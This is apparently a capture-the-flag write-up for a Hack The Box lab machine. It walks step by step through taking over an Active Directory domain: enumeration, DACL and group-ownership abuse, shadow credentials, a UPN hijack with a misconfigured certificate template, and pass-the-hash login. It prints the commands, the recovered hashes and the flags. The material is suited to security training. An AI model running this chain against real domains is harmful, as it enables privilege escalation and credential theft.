# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :----------- |
| 53 | domain |
| 88 | kerberos-sec |
| 135 | msrpc |
| 139 | netbios-ssn |
| 389 | ldap |
| 445 | microsoft-ds |
| 464 | kpasswd5 |
| 593 | ncacn_http |
| 636 | ssl/ldap |
| 3268 | ldap |
| 3269 | ssl/ldap |
| 5985 | http |
| 9389 | mc-nmf |

![Pasted image 20250312100202.png](../../IMAGES/Pasted%20image%2020250312100202.png)



# RECONNAISSANCE
---


Let's start with some basic SMB enumeration:


```
netexec smb 10.10.11.41

SMB 10.10.11.41 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
```

We got the domain name: `certified.htb`, let's keep on enumerating:


```
netexec smb 10.10.11.41 -u 'judith.mader' -p 'judith09'

SMB 10.10.11.41 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB 10.10.11.41 445 DC01 [+] certified.htb\judith.mader:judith09
```

The credentials we were given show that we have low-initial access to the domain, thanks to this, we can keep enumerating stuff, let's try to enumerate smb shares, but before all of this, let's add the domain controller to `/etc/hosts`:

```bash
echo '10.10.11.41 dc01.certified.htb certified.htb' | sudo tee -a /etc/hosts
```

```
netexec smb 10.10.11.41 -u 'judith.mader' -p 'judith09' --shares
SMB 10.10.11.41 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB 10.10.11.41 445 DC01 [+] certified.htb\judith.mader:judith09 
SMB 10.10.11.41 445 DC01 [*] Enumerated shares
SMB 10.10.11.41 445 DC01 Share Permissions Remark
SMB 10.10.11.41 445 DC01 ----- ----------- ------
SMB 10.10.11.41 445 DC01 ADMIN$ Remote Admin
SMB 10.10.11.41 445 DC01 C$ Default share
SMB 10.10.11.41 445 DC01 IPC$ READ Remote IPC
SMB 10.10.11.41 445 DC01 NETLOGON READ Logon server share
SMB 10.10.11.41 445 DC01 SYSVOL READ Logon server share
```

Not a single interesting share, let's keep on enumerating, let's enumerate ldap with bloodhound:

```
netexec ldap dc01.certified.htb -u judith.mader -p judith09 --bloodhound --collection All --dns-tcp --dns-server 10.10.11.41
SMB 10.10.11.41 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
LDAP 10.10.11.41 389 DC01 [+] certified.htb\judith.mader:judith09 
LDAP 10.10.11.41 389 DC01 Resolved collection methods: localadmin, group, dcom, acl, session, trusts, container, psremote, rdp, objectprops
LDAP 10.10.11.41 389 DC01 Done in 00M 30S
LDAP 10.10.11.41 389 DC01 Compressing output into /home/kali/.nxc/logs/DC01_10.10.11.41_2025-03-12_113336_bloodhound.zip
```

Now, let's analyze the data with bloodhound:

![Pasted image 20250312104456.png](../../IMAGES/Pasted%20image%2020250312104456.png)

For all kerberoastable accounts we find `management_svc`, let's keep on searching:

![Pasted image 20250312104920.png](../../IMAGES/Pasted%20image%2020250312104920.png)
![Pasted image 20250312110254.png](../../IMAGES/Pasted%20image%2020250312110254.png)

So, after enumerating all, we can point out these key features:

1. `judith.mader` permissions:
- `WriteOwner` permissions on the `Management Group`
2. `management_svc` permissions:
- `GenericWrite` permissions on the `Management Group`
- `GenericAll` permissions over the `ca_operator` account

With this info, we can start exploitation.


# EXPLOITATION
---

Once we know the permissions we have, we can start escalating our privileges, let's start with using the `WriteOwner` permission of `judith.mader` to set that user as owner of the management group, for this, let's use `bloodyAD`:

```
bloodyAD --host "10.10.11.41" -d "certified.htb" -u "judith.mader" -p "judith09" set owner Management judith.mader

[+] Old owner S-1-5-21-729746778-2675978091-3820388244-512 is now replaced by judith.mader on Management
```

Nice, we are now owner of the management group, let's update the group permissions to enable the write permission, for this, we can use `dacledit`:


```
sudo python3 dacledit.py -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' 'certified.htb'/'judith.mader':'judith09'

[*] DACL backed up to dacledit-20250312-130240.bak
[*] DACL modified successfully
```


Next step would be adding `judith.mader` to Management group:


```
bloodyAD --host 10.10.11.41 -d 'certified.htb' -u 'judith.mader' -p 'judith09' add groupMember "Management" "judith.mader"

[+] judith.mader added to Management
```

There we go, now, we can exploit **KeyCredentialLink**, **KeyCredentialLink** is an attribute in Active Directory (AD) that stores **public key credentials** linked to a user or computer account. These credentials are used for modern authentication methods like **Windows Hello for Business** or **FIDO2 security keys**. When exploited, this attribute allows attackers to **add their own malicious public key** to a target account, enabling authentication **without knowing the account's password**.

In order to exploit this, we can use `pywhisker`:

```
python3 pywhisker.py -d "certified.htb" -u "judith.mader" -p judith09 --target "management_svc" --action add

[*] Searching for the target account
[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: d98831f9-11eb-7a98-1ce4-4b3f2fe83cff
[*] Updating the msDS-KeyCredentialLink attribute of management_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: GNJ5gqL7.pfx
[+] PFX exportiert nach: GNJ5gqL7.pfx
[i] Passwort fÃ¼r PFX: VLVMMXcUZpo6JQ3sSY3C
[+] Saved PFX (#PKCS12) certificate & key at path: GNJ5gqL7.pfx
[*] Must be used with password: VLVMMXcUZpo6JQ3sSY3C
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

We can now obtain the TGT with the tool specified at the end of pywhisker, let's install it and use it:

```
python3 gettgtpkinit.py certified.htb/management_svc -cert-pfx /home/kali/pywhisker/pywhisker/GNJ5gqL7.pfx -pfx-pass VLVMMXcUZpo6JQ3sSY3C cache.ccache

2025-03-12 13:18:45,538 minikerberos INFO Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-03-12 13:18:45,567 minikerberos INFO Requesting TGT
INFO:minikerberos:Requesting TGT
Traceback (most recent call last):
 File "/home/kali/PKINITtools/gettgtpkinit.py", line 349, in <module>
 main()
 ~~~~^^
 File "/home/kali/PKINITtools/gettgtpkinit.py", line 345, in main
 amain(args)
 ~~~~~^^^^^^
 File "/home/kali/PKINITtools/gettgtpkinit.py", line 315, in amain
 res = sock.sendrecv(req)
 File "/home/kali/pywhisker/myenv/lib/python3.13/site-packages/minikerberos/network/clientsocket.py", line 85, in sendrecv
 raise KerberosError(krb_message)
minikerberos.protocol.errors.KerberosError: Error Name: KRB_AP_ERR_SKEW Detail: "The clock skew is too great"
```

Got an error, this occurs due to the clock time of our machine being out of sync with the domain controller, let's fix it:

```
sudo timedatectl set-ntp off
# We need to install ntpdate to do this, in kali: sudo apt install ntpdate
sudo ntpdate -u dc01.certified.htb
```

Now, let's try again:

```
python3 gettgtpkinit.py certified.htb/management_svc -cert-pfx /home/kali/pywhisker/pywhisker/GNJ5gqL7.pfx -pfx-pass VLVMMXcUZpo6JQ3sSY3C cache.ccache
2025-03-12 20:28:18,490 minikerberos INFO Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-03-12 20:28:18,515 minikerberos INFO Requesting TGT
INFO:minikerberos:Requesting TGT
2025-03-12 20:28:40,123 minikerberos INFO AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-03-12 20:28:40,123 minikerberos INFO e0da658aa6af3696f137ffd2c81f0daf1c585c4c692f7418affa0e9fde5e381f
INFO:minikerberos:e0da658aa6af3696f137ffd2c81f0daf1c585c4c692f7418affa0e9fde5e381f
2025-03-12 20:28:40,125 minikerberos INFO Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

There we go, we successfully got our key, we can use this key to recover the NT hash of `management_svc`, we can do this with the integrated python script from the repository we downloaded in the previous step:

```
python3 getnthash.py certified.htb/management_svc -key e0da658aa6af3696f137ffd2c81f0daf1c585c4c692f7418affa0e9fde5e381f

[-] CCache file is not found. Skipping...
[-] No TGT found from ccache, did you set the KRB5CCNAME environment variable?
```

We got an error, we need to set the `KRB5CCNAME` to point out our `cache.ccache` file:

```
export KRB5CCNAME=cache.ccache
```

Now, let's use it again:

```
python3 getnthash.py certified.htb/management_svc -key e0da658aa6af3696f137ffd2c81f0daf1c585c4c692f7418affa0e9fde5e381f
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
a091c1832bcdd4677c28b5a6a1295584
```

There we go, we got our ticket, with this, we could go inside Winrm and get our user flag, but let's proceed with privilege escalation.


# PRIVILEGE ESCALATION
---


From what we found at the reconnaissance stage, we discovered that `management_svc` has `GenericAll` permission over `ca_operator` account, **GenericAll** is a powerful permission in Active Directory (AD) that grants **full control** over a target object (e.g., a user, group, computer, or organizational unit). If a user or group has the`GenericAll` privilege over another object, they can perform **any action** on that object, including modifying its attributes, resetting passwords, deleting it, or adding/removing members (for groups).

So, let's break down our privilege escalation, we can work our way into admin in the following way:

```
1. Abuse GenericAll Rights**
2. Add KeyCredentialLink (Shadow Credentials)
3. Hijack UPN to Impersonate Administrator
4. Request Administrator Certificate
5. Restore UPN 
6. Authenticate as Administrator via PKINIT
7. Lateral Movement with Evil-WinRM
```

We can check our key terms:

### **Key Terms & Techniques**

1. **GenericAll Rights**:
 - A permission granting full control over an AD object (e.g., user, group).

2. **KeyCredentialLink**:

- An AD attribute storing public keys for certificate-based authentication.

3. **UserPrincipalName (UPN)**:

- An identifier formatted as`user@domain` (e.g.,`administrator@certified.htb`).

4. **Certificate Template Misconfiguration**:

- A vulnerable template (`CertifiedAuthentication`) allowed enrollment without proper validation.

5. **PKINIT Authentication**:

- Kerberos authentication using certificates instead of passwords.

Ok, once we've structured all, let's put it into practice:


**Adding KeyCredential**

```
certipy-ad shadow auto -u management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -account ca_operator

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_operator'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'b36104d9-a205-51d9-4f39-59729e993822'
[*] Adding Key Credential with device ID 'b36104d9-a205-51d9-4f39-59729e993822' to the Key Credentials for 'ca_operator'
[*] Successfully added Key Credential with device ID 'b36104d9-a205-51d9-4f39-59729e993822' to the Key Credentials for 'ca_operator'
[*] Authenticating as 'ca_operator' with the certificate
[*] Using principal: ca_operator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_operator.ccache'
[*] Trying to retrieve NT hash for 'ca_operator'
[*] Restoring the old Key Credentials for 'ca_operator'
[*] Successfully restored the old Key Credentials for 'ca_operator'
[*] NT hash for 'ca_operator': b4b86f45c6018f1b664f70805f45d8f2
```

There we go, our next step is **Updating the UPN of `ca_operator` to `administrator`**:

```
certipy-ad account update -u management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn administrator

[*] Updating user 'ca_operator':
 userPrincipalName : administrator
[*] Successfully updated 'ca_operator'
```

There we go, next step is **Requesting our administrator certificate**:

```
certipy-ad req -username ca_operator@certified.htb -hashes b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication -debug


[+] Trying to resolve 'CERTIFIED.HTB' at '192.168.200.2'
[+] Resolved 'CERTIFIED.HTB' from cache: 10.10.11.41
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.10.11.41[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.10.11.41[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 4
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

Nice, now, let's **restore the `ca_operator` UPN to its original value**:

```
certipy-ad account update -u management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb


[*] Updating user 'ca_operator':
 userPrincipalName : ca_operator@certified.htb
[*] Successfully updated 'ca_operator
```

Nice, now, we need to **obtain the admin TGT and the Hash**:

```
certipy-ad auth -pfx administrator.pfx -domain certified.htb

[*] Using principal: administrator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
```

There we go, we got our hash and can now authenticate using `evil-winrm`:


```
evil-winrm -u administrator -H 0d5b49608bbce1751f708748f67e2d34 -i 10.10.11.41

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

There we go, we successfully pwned this machine, let's read both flags:

```
*Evil-WinRM* PS C:\Users\management_svc\Desktop> type user.txt
70ddf966d617b1cde86186bcb3a34f11
```

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
e0b8d6567066b1694c8c65817163a553
```

![Pasted image 20250312125720.png](../../IMAGES/Pasted%20image%2020250312125720.png)

https://www.hackthebox.com/achievement/machine/1872557/633

